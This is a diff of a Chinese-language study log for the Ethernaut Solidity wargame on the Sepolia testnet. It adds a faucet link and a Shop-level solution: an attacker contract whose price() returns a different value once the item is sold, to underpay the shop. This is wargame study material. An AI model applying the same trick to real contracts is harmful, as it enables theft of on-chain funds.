@@ -18,6 +18,7 @@ timezone: Asia/Shanghai
 1. eth sepolia rpc: https://eth-sepolia.public.blastapi.io
 2. 现在测试网水龙头变得麻烦了，要求主网要有余额。
 水龙头：https://sepolia-faucet.pk910.de/#/
+       https://www.alchemy.com/faucets/ethereum-sepolia
 3. 测试1部署合约：0x480Ee5663698aA065B3c971722eda3e835ce024d
 4. 根据教程一步步执行，最后通过 authenticate 方法提交答案
 #### Ethernaut - Fallback
@@ -164,6 +165,35 @@ contract BuildingImpl is Building {
 #### Ethernaut - Privacy
 Vault 的进阶版，需要通过web3js获取存储的数据，需要学习下evm中是如何存储数据的
 合约地址：0x57c70Fd38b1D9B453013EF0b6021B926EA131E6e
+
+### 2024.09.05
+#### Ethernaut - Shop
+可以实现一个动态的 被调用函数
+合约地址：0x2eafa118534F7B4652d7e7Ee5e2d6146d32E620e
+```
+contract BuyerImpl {
+    address public shopAddress;
+    
+    constructor() {}
+    
+    function setShopAddress(address _shopAddress) public  {
+        shopAddress = _shopAddress;
+    }
+
+    function payForShop(address _shopAddress) payable public {
+        Shop _shop = Shop(_shopAddress);
+        _shop.buy();
+    }
+
+    function price() external view returns (uint256) {
+        Shop _shop = Shop(shopAddress);
+        if (_shop.isSold()) {
+            return 1;
+        }
+        return 101;
+    }
+}
+```
 
 
 <!-- Content_END -->
